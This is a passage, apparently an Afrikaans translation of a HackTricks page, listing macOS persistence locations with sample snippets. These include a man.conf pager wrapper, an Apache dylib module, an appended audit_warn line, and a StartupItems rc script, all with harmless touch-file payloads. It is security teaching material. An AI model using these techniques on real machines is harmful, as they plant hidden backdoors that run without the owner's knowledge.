Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Nuttig om sandboks te omseil: [🟠](https://emojipedia.org/large-orange-circle)
* Maar jy moet 'n root wees en die gebruiker moet man gebruik
* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

* **`/private/etc/man.conf`**
* Root benodig
* **`/private/etc/man.conf`**: Telkens wanneer man gebruik word

#### Beskrywing & Uitbuiting

Die konfigurasie lêer **`/private/etc/man.conf`** dui die binêre/skripsie aan om te gebruik wanneer man dokumentasie lêers oopmaak. Dus kan die pad na die uitvoerbare lêer gewysig word sodat elke keer as die gebruiker man gebruik om 'n paar dokumente te lees, 'n agterdeur uitgevoer word.

Byvoorbeeld ingestel in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
En skep dan `/tmp/view` as:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Bespreking**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Nuttig om sandboks te omseil: [🟠](https://emojipedia.org/large-orange-circle)
* Maar jy moet 'n root wees en apache moet loop
* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
* Httpd het nie toestemmings nie

#### Ligging

* **`/etc/apache2/httpd.conf`**
* Root benodig
* Trigger: Wanneer Apache2 begin

#### Beskrywing & Uitbuiting

Jy kan in `/etc/apache2/httpd.conf` aandui om 'n module te laai deur 'n lyn by te voeg soos:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Op hierdie manier sal jou saamgestelde modules deur Apache gelaai word. Die enigste ding is dat jy dit óf met 'n geldige Apple-sertifikaat moet **teken**, óf jy moet 'n nuwe vertroude sertifikaat in die stelsel **byvoeg** en dit daarmee **teken**.

Dan, indien nodig, om seker te maak dat die bediener gestart sal word, kan jy uitvoer:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Kodevoorbeeld vir die Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM ouditraamwerk

Skryf op: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Nuttig om sander te omseil: [🟠](https://emojipedia.org/large-orange-circle)
* Maar jy moet 'n hoofgebruiker wees, auditd moet loop en 'n waarskuwing veroorsaak
* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Plek

* **`/etc/security/audit_warn`**
* Root benodig
* **Trigger**: Wanneer auditd 'n waarskuwing opspoor

#### Beskrywing & Uitbuiting

Telkens wanneer auditd 'n waarskuwing opspoor, word die skriffie **`/etc/security/audit_warn`** **uitgevoer**. Jy kan dus jou lading daarbyvoeg.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
### Begin Items

{% hint style="danger" %}
**Dit is verouderd, so niks behoort in daardie gids gevind te word nie.**
{% endhint %}

Die **StartupItem** is 'n gids wat binne of `/Library/StartupItems/` of `/System/Library/StartupItems/` geplaas moet word. Nadat hierdie gids gevestig is, moet dit twee spesifieke lêers insluit:

1. 'n **rc-skrip**: 'n skulpskrip wat by aanvang uitgevoer word.
2. 'n **plist-lêer**, spesifiek genoem `StartupParameters.plist`, wat verskeie opsetinstellings bevat.

Verseker dat beide die rc-skrip en die `StartupParameters.plist`-lêer korrek binne die **StartupItem**-gids geplaas word sodat die aanvangsproses hulle kan herken en gebruik.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %}  
### superservicename

Hierdie diens is verantwoordelik vir die uitvoering van belangrike funksies op die stelsel. Dit is belangrik om te verseker dat die diens nie misbruik word deur aanvallers om toegang tot die stelsel te verkry nie. Dit is raadsaam om die nodige maatreëls te tref om die veiligheid van hierdie diens te verseker.  
{% endtab %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Ek kan hierdie komponent nie in my macOS vind nie, vir meer inligting kyk na die skryfstuk
{% endhint %}

Skryfstuk: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Deur Apple bekendgestel, **emond** is 'n loggingsmeganisme wat lyk of dit onderontwikkel is of moontlik verlate is, maar dit bly toeganklik. Alhoewel dit nie besonders voordelig is vir 'n Mac-administrateur nie, kan hierdie obskure diens as 'n subtiel volhardingsmetode vir dreigingsakteurs dien, moontlik onopgemerk deur die meeste macOS-administrateurs.

Vir diegene wat bewus is van sy bestaan, is dit maklik om enige skadelike gebruik van **emond** te identifiseer. Die stelsel se LaunchDaemon vir hierdie diens soek skripte om in 'n enkele gids uit te voer. Om dit te inspekteer, kan die volgende bevel gebruik word:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Plek

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Wortel nodig
* **Trigger**: Met XQuartz

#### Beskrywing & Uitbuiting

XQuartz is **nie meer geïnstalleer in macOS nie**, soek vir meer inligting in die writeup.

### ~~kext~~

{% hint style="danger" %}
Dit is so ingewikkeld om kext selfs as root te installeer dat ek dit nie sal oorweeg om uit sandbokse te ontsnap of selfs vir volharding nie (tensy jy 'n uitbuiting het)
{% endhint %}

#### Plek

Om 'n KEXT as 'n aanvangsitem te installeer, moet dit in een van die volgende plekke wees:

* `/System/Library/Extensions`
* KEXT-lêers wat in die OS X-bedryfstelsel ingebou is.
* `/Library/Extensions`
* KEXT-lêers wat deur derdeparty sagteware geïnstalleer is

Jy kan tans gelaai kext-lêers lys met:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Vir meer inligting oor [**kernel-uitbreidings sien hierdie afdeling**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Verslag: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Ligging

* **`/usr/local/bin/amstoold`**
* Wortel vereis

#### Beskrywing & Uitbuiting

Dit blykbaar dat die `plist` van `/System/Library/LaunchAgents/com.apple.amstoold.plist` hierdie binêre gebruik het terwyl dit 'n XPC-diens blootgestel het... die ding is dat die binêre nie bestaan het nie, so jy kon iets daar plaas en wanneer die XPC-diens geroep word, sal jou binêre geroep word.

Ek kan dit nie meer in my macOS vind nie.

### ~~xsanctl~~

Verslag: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Ligging

* **`/Library/Preferences/Xsan/.xsanrc`**
* Wortel vereis
* **Trigger**: Wanneer die diens uitgevoer word (skaars)

#### Beskrywing & uitbuiting

Dit blyk nie baie algemeen te wees om hierdie skripsie uit te voer nie en ek kon dit selfs nie in my macOS vind nie, so as jy meer inligting wil hê, kyk na die verslag.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Dit werk nie in moderne MacOS-weergawes nie**
{% endhint %}

Dit is ook moontlik om hier **opdragte te plaas wat by aanvang uitgevoer sal word.** Voorbeeld van 'n gewone rc.common-skrips:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Aanhoudingstegnieke en -gereedskap

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{% hint style="success" %}
Leer en oefen AWS-hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer en oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
